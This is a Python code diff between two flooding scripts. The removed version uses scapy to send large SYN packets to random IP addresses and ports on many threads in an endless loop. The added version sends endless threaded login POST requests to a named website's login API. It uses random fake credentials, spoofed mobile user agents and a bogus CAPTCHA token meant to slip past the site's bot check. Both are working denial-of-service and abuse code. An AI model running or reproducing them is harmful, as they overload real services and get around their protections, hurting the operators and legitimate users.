@@ -1,41 +1,43 @@
+import requests
 import threading
-from scapy.all import *
 import random
+import string
 import time
 
-def generate_random_ip():
-    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
+def generate_random_string(length):
+    letters_and_digits = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters_and_digits) for i in range(length))
+fk = generate_random_string(1)
+print(fk)
+def GenLogin():
+    url = 'https://backend.kibomodz.online/api/users/login'
+    an_agent = f'Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Content-Type': 'application/json',
+        'User-Agent': an_agent,
+        'Referer': 'https://kibomodz.online/auth/login'
+    }
+    data = {
+        'email': generate_random_string(13) + "@gmail.com",
+        'password': generate_random_string(10),
+        "turnstileToken": fk
+    }
 
-def generate_random_port():
-    return random.randint(1024, 65535)
+    response = requests.post(url, headers=headers, json=data)
+    print(response)
 
-def send_syn_packet(target_ip, target_port):
-    payload = Raw(load="fuck" * 1400)
-    ip = IP(dst=target_ip)
-    syn = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000))
-    packet = ip/syn/payload
-    send(packet, verbose=False)
-
-def load_test():
-    target_ip = generate_random_ip()
-    target_port = generate_random_port()
-    print(f"بدأ الاختبار: إرسال حزم بحجم 1 ميجا إلى {target_ip} على المنفذ {target_port}")
-    
-    for i in range(100):
-        send_syn_packet(target_ip, target_port)
-        #time.sleep(0.2)
-    
-    print("انتهى الاختبار!")
-
-def Range_Range():
+def rangeLogin():
     threads = []
-    for i in range(70):
-        thread = threading.Thread(target=load_test)
+    for i in range(random.randint(1, 100)):
+        thread = threading.Thread(target=GenLogin)
         threads.append(thread)
         thread.start()
+        time.sleep(random.uniform(0.5, 1.5))
 
     for thread in threads:
         thread.join()
 
+
 while True:
-	Range_Range()
+	rangeLogin()
